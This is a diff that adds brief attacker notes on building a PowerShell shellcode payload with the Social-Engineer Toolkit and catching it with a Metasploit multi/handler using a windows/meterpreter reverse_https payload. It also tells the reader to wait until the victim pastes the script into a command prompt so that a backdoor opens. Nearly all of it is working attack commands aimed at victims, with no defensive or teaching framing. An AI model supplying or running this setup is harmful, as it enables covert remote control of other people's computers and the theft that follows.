@@ -1,0 +1,29 @@
+Dont use technology based payload eg.adobe as it is hard to predict if it is installed in victim machine
+Instead use a payload that OS will trust eg powershell payload
+
+>setoolkit
+--------------------
+generate a payload:
+
+9) Powershell Attack Vectors
+1) Powershell Alphanumeric Shellcode Injector
+they are exported to /root/.set/reports/powershell
+99 //exit
+
+--------------------
+
+create the listener/handler:
+>msfconsole
+msf>search type:exploit handler
+msf>use multi/handler
+msf exploit(handler)>show payloads
+msf exploit(handler)>set payload windows/meterpreter/reverse_https
+msf>set LPORT 443
+msf>set LHOST 0.0.0.0
+msf>set ExitOnSession false
+msf>exploit -j  
+Now we have to wait ,until victim runs the above powershell script in his machine.
+copy the powershell content,paste it on cmd prompt,then backdoor will open
+-----------------------
+
+
